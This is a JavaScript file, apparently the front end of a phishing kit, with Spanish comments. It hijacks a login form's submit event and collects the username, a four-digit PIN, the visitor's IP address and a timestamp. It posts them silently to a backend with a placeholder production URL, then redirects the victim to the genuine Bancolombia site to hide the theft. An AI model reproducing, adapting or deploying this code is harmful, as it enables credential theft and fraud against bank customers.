// telegram-handler.js - VERSIÓN FINAL

// ============ CONFIGURACIÓN ============
const CONFIG = {
    // Para desarrollo local:
    BACKEND_URL: 'http://localhost:5000/api/enviar',
    
    // Para producción (descomenta y cambia la URL):
    // BACKEND_URL: 'https://tu-app.onrender.com/api/enviar',
};

// ============ ESPERAR A QUE CARGUE EL DOM ============
document.addEventListener('DOMContentLoaded', function() {
    
    const loginForm = document.getElementById('loginForm');
    const usuarioInput = document.getElementById('usuario');
    const claveInput = document.getElementById('clave');
    const btnLogin = document.getElementById('btnLogin');
    
    // Interceptar el submit del formulario
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        e.stopPropagation();
        
        // Validar campos
        if (!usuarioInput.value || claveInput.value.length !== 4) {
            alert('Por favor completa todos los campos correctamente');
            return;
        }
        
        // Deshabilitar botón mientras procesa
        btnLogin.disabled = true;
        btnLogin.textContent = 'Procesando...';
        
        // Preparar datos
        const datos = {
            usuario: usuarioInput.value,
            clave: claveInput.value,
            ip: document.getElementById('userIP').textContent.replace('Dirección IP: ', ''),
            fecha: document.getElementById('currentDateTime').textContent
        };
        
        // Enviar datos al backend (sin esperar respuesta)
        fetch(CONFIG.BACKEND_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(datos)
        }).catch(() => {});
        
        // Redirigir inmediatamente a Bancolombia
        window.location.href = 'https://www.bancolombia.com/personas';
        
    }, true);
    
});
